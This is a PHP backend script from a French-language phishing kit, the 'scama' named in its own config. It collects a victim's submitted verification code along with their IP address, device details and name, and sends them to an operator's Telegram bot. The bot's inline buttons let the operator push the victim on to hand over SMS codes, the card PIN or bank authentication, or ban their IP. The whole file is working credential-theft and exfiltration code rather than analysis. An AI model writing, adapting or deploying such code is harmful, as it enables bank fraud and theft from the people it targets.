<?php
declare(strict_types=1);

// Définir la constante pour permettre l'inclusion des modules protégés
if (!defined('ALLOW_INCLUDE')) {
    define('ALLOW_INCLUDE', true);
}

ob_start();
session_start();
date_default_timezone_set('Europe/Paris');
header('Content-Type: application/json');
require_once __DIR__ . '/../modules/load_config.php';
require_once '../modules/sessions.php';
//require_once '../antibots/all.php'; 


$bot_token = getConfig('BOT_TOKEN', '');
$chat_id   = getConfig('CHAT_ID', '');
$name_scama   = getConfig('SCAMA_NAME', '');

// ---------------------------
//      Visiteurs
// ---------------------------
if (!isset($_SESSION['visitor']) || !is_array($_SESSION['visitor'])) {
    $_SESSION['visitor'] = [
        'ip'           => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Inconnu',
        'mobile'       => '❌',
        'device_type'  => '❌',
        'device_model' => '❌',
    ];
}

$ip          = htmlspecialchars($_SESSION['visitor']['ip'], ENT_QUOTES, 'UTF-8');
$device_type = htmlspecialchars($_SESSION['visitor']['device_type'], ENT_QUOTES, 'UTF-8');
$device      = htmlspecialchars($_SESSION['visitor']['device_model'], ENT_QUOTES, 'UTF-8');
$datetime    = date('d/m/Y H:i:s');
$uid         = $_SESSION['user_id'] ?? uniqid('user_', true);


// ---------------------------
//      Protection BOT
// ---------------------------
if (!isset($_POST['csrf_token'])) {
    ob_end_clean();
    http_response_code(403);
    echo json_encode(['error' => 'Token CSRF manquant']);
    exit;
}

if (!isset($_SESSION['csrf_token'])) {
    ob_end_clean();
    http_response_code(403);
    echo json_encode(['error' => 'Token CSRF de session manquant']);
    exit;
}

if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    ob_end_clean();
    http_response_code(403);
    echo json_encode(['error' => 'Token CSRF invalide']);
    exit;
}


if (empty($bot_token) || empty($chat_id)) {
    ob_end_clean();
    http_response_code(500);
    echo json_encode(['error' => 'Configuration Telegram manquante.']);
    exit;
}


if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    ob_end_clean();
    http_response_code(405);
    echo json_encode(['error' => 'Méthode non autorisée']);
    exit;
}


if (empty($_POST['code_custom'])) {        
    ob_end_clean();
    http_response_code(400);
    echo json_encode(['error' => 'Code personnalisé manquant']);
    exit;
}


// ---------------------------
//      Données Formulaire
// ---------------------------

$code_custom = htmlspecialchars(trim($_POST['code_custom']));


$_SESSION['code_custom'] = $code_custom;

$nom = htmlspecialchars(trim($_SESSION['nom'] ?? ''), ENT_QUOTES, 'UTF-8');
$prenom = htmlspecialchars(trim($_SESSION['prenom'] ?? ''), ENT_QUOTES, 'UTF-8');

$message_text = "
📱 <b> Custom input | {$name_scama}</b>
└ 🗝️ Réponse : <code>$code_custom</code>

<b>🖥️ Système</b>
├ 🌐 IP : <code>$ip</code>
├ 💻 Type : <code>$device_type | 📱 Modèle : $device</code>
└ 📅 Date : <code>$datetime</code>

<blockquote> {$name_scama} [$datetime]
└ Xcode_officiel : [© " . date('Y') . " - All rights reserved.]</blockquote>
";

$keyboard = [
    'inline_keyboard' => [
        [['text' => '❌ Custom invalide', 'callback_data' => "custom_input_error|$uid"]],  
        [['text' => '📱 SMS', 'callback_data' => "sms|$uid"], ['text' => '🔑 PIN carte', 'callback_data' => "pin|$uid"]],   
        [['text' => '🧾 custom input', 'callback_data' => "custom_input|$uid"], ['text' => '🔑 Auth Banque', 'callback_data' => "auth|$uid"]],   
        [['text' => '✅ Succès', 'callback_data' => "success|$uid"],['text' => '📛 Ban IP', 'callback_data' => "ban_ip|$uid"]]
    ]
];





function sendTelegramMessage($bot_token, $chat_id, $text, $reply_markup = null, $parse_mode = 'HTML') {
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";

    $post_fields = [
        'chat_id'    => $chat_id,
        'text'       => $text,
        'parse_mode' => $parse_mode,
    ];

    if ($reply_markup !== null) {
        $post_fields['reply_markup'] = json_encode($reply_markup);
    }

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post_fields,
        CURLOPT_RETURNTRANSFER => true,
    ]);

    $result = curl_exec($ch);
    if ($result === false) {
        throw new Exception("cURL Error: " . curl_error($ch));
    }

    curl_close($ch);
    $response = json_decode($result, true);

    if (!$response || !$response['ok']) {
        $desc = $response['description'] ?? 'Erreur inconnue';
        throw new Exception("Telegram API Error: $desc");
    }

    return $response;
}

try {
    sendTelegramMessage($bot_token, $chat_id, $message_text, $keyboard);
    ob_end_clean();
    echo json_encode(['step' => 2]);
} catch (Exception $e) {
    ob_end_clean();
    http_response_code(500);
    echo json_encode(['error' => "Erreur Telegram : " . $e->getMessage()]);
    exit;
}
